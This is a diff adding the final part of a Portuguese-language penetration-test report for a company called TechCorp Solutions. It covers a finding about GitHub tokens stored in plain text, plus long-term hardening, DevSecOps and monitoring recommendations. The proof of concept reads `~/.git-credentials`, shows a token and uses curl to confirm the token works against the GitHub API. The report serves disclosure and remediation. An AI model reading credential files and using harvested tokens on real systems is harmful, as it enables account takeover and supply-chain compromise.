+    <h4 id="prova-de-conceito-poc-16">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Localização e leitura do arquivo <code>.git-credentials</code>:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>techcorp@024a36a8e6ca:~$ <span class="hljs-built_in">cat</span> ~/.git-credentials
+https://techcorp-dev:ghp_K8v9x2mP1qR4tY7wZ0nB3jL6lM5hG890AbCd@github.com
+</div></code></pre>
+    <ol start="2">
+      <li>Validação da autenticidade do token via API oficial do GitHub:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>curl -s -H <span class="hljs-string">&quot;Authorization: token ghp_K8v9x2mP1qR4tY7wZ0nB3jL6lM5hG890AbCd&quot;</span> \
+     <span class="hljs-string">&quot;https://api.github.com/user&quot;</span> | grep -E <span class="hljs-string">&#x27;&quot;login&quot;|&quot;email&quot;&#x27;</span>
+</div></code></pre>
+    <ol start="3">
+      <li>Resposta da API confirmando acesso autenticado:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>  <span class="hljs-attr">&quot;login&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;techcorp-dev&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dev@techcorpsolutions.com&quot;</span>
+</div></code></pre>
+    <h4 id="impactos-16">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Acesso integral aos repositórios
+        privados da empresa, histórico de commits, credenciais de integração e
+        possibilidade de ataques à cadeia de suprimentos (<em
+          >Supply Chain Attack</em
+        >).
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Vazamento de propriedade
+        intelectual, código proprietário e comprometimento de produtos
+        distribuídos aos clientes.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-16">Remediação Técnica</h4>
+    <ol>
+      <li>
+        Revogar imediatamente o token <code>ghp_...</code> nas configurações do
+        GitHub.
+      </li>
+      <li>
+        Desativar o helper <code>store</code> do Git que salva credenciais em
+        texto puro.
+      </li>
+      <li>
+        Utilizar o Git Credential Manager ou chaves SSH com senha para
+        autenticação de desenvolvedores.
+      </li>
+    </ol>
+    <p><em>Comando para remover o armazenamento inseguro:</em></p>
+    <pre
+      class="hljs"
+    ><code><div>git config --global --<span class="hljs-built_in">unset</span> credential.helper
+<span class="hljs-built_in">rm</span> -f ~/.git-credentials
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f17_git_token_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f17_git_token_abuse.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>:
+          <code>slides/module_secrets_f17.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <h2 id="5-recomendações-estratégicas-de-longo-prazo">
+      5. RECOMENDAÇÕES ESTRATÉGICAS DE LONGO PRAZO
+    </h2>
+    <p>
+      Para mitigar os riscos estruturais identificados durante o teste de
+      intrusão, recomenda-se a implementação de um plano de remediação
+      estruturado em quatro pilares fundamentais:
+    </p>
+    <pre
+      class="hljs"
+    ><code><div>+-------------------------------------------------------------------------+
+|                  PLANO DE REMEDIAÇÃO ESTRATÉGICA                        |
++-------------------------------------------------------------------------+
+|  1. ARQUITETURA &amp; HARDENING                                             |
+|     - Isolamento total de banco de dados (bind 127.0.0.1)               |
+|     - Desativação de serviços legados (FTP sem TLS / senhas SSH)        |
++-------------------------------------------------------------------------+
+|  2. DESENVOLVIMENTO SEGURO (SDLC)                                       |
+|     - Implementação de SAST/DAST no pipeline de CI/CD                   |
+|     - Adoção obrigatória de Prepared Statements (PDO)                   |
++-------------------------------------------------------------------------+
+|  3. GESTÃO DE SEGREDOS                                                  |
+|     - Eliminação de credenciais hardcoded em scripts                    |
+|     - Utilização de cofres corporativos (HashiCorp Vault / AWS Secrets) |
++-------------------------------------------------------------------------+
+|  4. CULTURA &amp; CONSCIENTIZAÇÃO                                           |
+|     - Treinamentos periódicos de conscientização contra Engenharia      |
+|       Social e proteção de dados corporativos (crachás, conversas)      |
++-------------------------------------------------------------------------+
+</div></code></pre>
+    <h3 id="51-hardening-de-servidores-e-redução-de-superfície">
+      5.1. Hardening de Servidores e Redução de Superfície
+    </h3>
+    <ul>
+      <li>
+        <strong>Isolamento de Banco de Dados:</strong> Restringir o serviço
+        MySQL para responder estritamente no socket Unix local ou na interface
+        interna de loopback (<code>bind-address = 127.0.0.1</code>), bloqueando
+        a exposição direta da porta 3306/TCP para a Internet.
+      </li>
+      <li>
+        <strong>Descontinuação do FTP Legado:</strong> Substituir o serviço
+        vsftpd desprotegido por protocolos modernos e autenticados com suporte a
+        criptografia em trânsito, como SFTP (subordinado ao SSH com chaves
+        criptográficas) ou HTTPS seguro.
+      </li>
+    </ul>
+    <h3 id="52-ciclo-de-vida-de-desenvolvimento-seguro-devsecops">
+      5.2. Ciclo de Vida de Desenvolvimento Seguro (DevSecOps)
+    </h3>
+    <ul>
+      <li>
+        <strong>Integração de Scanners no CI/CD:</strong> Adicionar ferramentas
+        de Análise Estática de Código (SAST) como SonarQube ou Semgrep para
+        bloquear builds que contenham queries SQL concatenadas, chamadas
+        inseguras de inclusão de arquivos
+        (<code>include</code>/<code>require</code>) ou comentários com
+        informações sensíveis.
+      </li>
+      <li>
+        <strong>Scan Contínuo de Segredos:</strong> Integrar ferramentas como
+        <em>TruffleHog</em> ou <em>Gitleaks</em> aos repositórios Git para
+        impedir o commit acidental de tokens de API, chaves privadas e arquivos
+        <code>.git-credentials</code>.
+      </li>
+    </ul>
+    <h3 id="53-monitoramento-de-integridade-e-resposta-a-incidentes">
+      5.3. Monitoramento de Integridade e Resposta a Incidentes
+    </h3>
+    <ul>
+      <li>
+        <strong>Implementação de FIM (File Integrity Monitoring):</strong>
+        Instalar agentes de monitoramento de integridade de arquivos (como Wazuh
+        ou OSSEC) para monitorar alterações não autorizadas em diretórios como
+        <code>/etc/</code>, <code>/var/www/html/</code> e <code>/opt/</code>.
+      </li>
+      <li>
+        <strong>Centralização de Logs (SIEM):</strong> Centralizar os logs do
+        Apache, OpenSSH e auditoria do Linux em um ambiente seguro, disparando
+        alertas em caso de padrões de SQL Injection, requisições repetidas com
+        wrappers PHP ou múltiplas tentativas de autenticação SSH.
+      </li>
+    </ul>
+    <hr />
+    <p>
+      <em
+        >Relatório consolidado e homologado para a avaliação de postura de
+        segurança da TechCorp Solutions.</em
+      >
+    </p>
+  </body>
+</html>
